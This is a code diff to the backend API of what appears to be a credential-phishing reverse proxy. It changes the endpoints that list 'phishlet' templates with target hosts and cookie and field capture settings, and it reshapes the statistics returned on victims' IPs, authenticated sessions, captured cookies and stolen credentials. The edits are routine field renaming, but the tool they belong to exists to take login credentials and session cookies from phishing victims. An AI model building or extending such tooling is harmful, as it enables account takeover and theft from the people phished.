@@ -60,11 +60,14 @@ async def get_templates():
         templates.append({
             'id': name,
             'name': config.name,
+            'target_url': f"{config.target_scheme}://{config.target_host}",
             'target_host': config.target_host,
             'description': f"Proxy for {config.name}",
-            'capture_cookies': config.capture_cookies,
+            'capture_cookies': len(config.capture_cookies) > 0,
             'capture_fields': config.capture_fields,
             'auth_urls': config.auth_urls,
+            'auth_indicators': config.auth_urls,
+            'browser_type': 'proxy',
         })
     return {'templates': templates}
 
@@ -342,7 +345,7 @@ async def export_session(session_id: str, format: str = Query(default="header"))
 @router.get("/stats")
 async def get_stats():
     """Get proxy engine statistics"""
-    stats = proxy_engine.get_stats()
+    raw_stats = proxy_engine.get_stats()
 
     # Add recent activity
     recent_sessions = sorted(
@@ -351,17 +354,24 @@ async def get_stats():
         reverse=True
     )[:5]
 
-    stats['recent_sessions'] = [
-        {
-            'id': s.id,
-            'victim_ip': s.victim_ip,
-            'authenticated': s.authenticated,
-            'created_at': s.created_at
-        }
-        for s in recent_sessions
-    ]
-
-    return stats
+    # Map to frontend expected field names
+    return {
+        'total_targets': raw_stats['total_phishlets'],
+        'active_sessions': raw_stats['active_phishlets'],
+        'authenticated_sessions': raw_stats['authenticated_sessions'],
+        'captures_with_cookies': raw_stats['total_cookies'],
+        'total_credentials': raw_stats['total_credentials'],
+        'total_sessions': raw_stats['total_sessions'],
+        'recent_sessions': [
+            {
+                'id': s.id,
+                'victim_ip': s.victim_ip,
+                'authenticated': s.authenticated,
+                'created_at': s.created_at
+            }
+            for s in recent_sessions
+        ]
+    }
 
 
 # ============== Targets (Legacy Compatibility) ==============
